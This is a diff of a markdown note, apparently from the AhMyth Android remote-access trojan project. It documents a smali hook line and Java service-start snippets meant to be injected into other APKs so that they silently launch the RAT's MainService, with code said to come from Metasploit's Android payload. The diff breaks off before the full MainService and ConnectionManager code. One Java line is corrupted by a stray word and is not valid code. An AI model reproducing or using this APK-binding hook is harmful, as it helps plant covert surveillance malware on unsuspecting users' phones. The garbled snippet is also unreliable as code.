@@ -1,17 +1,26 @@
-## New Hook Method
+## Code Sets for new static hook function
+
+The code for this new future function was taken from [Rapid7/metasploit-payloads](github.com/rapid7/metasploit-payloads), specifically their [androidpayload](https://github.com/Morsmalleo/metasploit-payloads/tree/master/java/androidpayload/app/src/com/metasploit/stage) directory.
+
+the files the coding for this new function were taken from in the **androidpayload** directory of the **metasploit-framework** repository are as follows;
+- MainActivity.java
+- MainService.java
+- MainBroadcastReceiver.java
+- Payload.java
+#
+- New Hook function to be injected into APK's
 ```smali
 invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
 ```
-## Java Code for static hook function
-- MainActivity.java
+- Service Start for MainActivity.java File
 ```java
-MainService.startService(this);
+MainService.startService(this); File
 ```
-- MyReciever.java
+- Service start for MyReciever.java Code
 ```java
 MainService.startService(context);
 ```
-- MainService.java
+- New MainService.java Code
 ```java
 package ahmyth.mine.king.ahmyth;
 
@@ -78,7 +87,7 @@ public class MainService extends Service {
             context.startService(new Intent(context, MainService.class));
         }
 ```
-- ConnectionManager.java
+- New ConnectionManager.java Code
 ```java
 package ahmyth.mine.king.ahmyth;
 
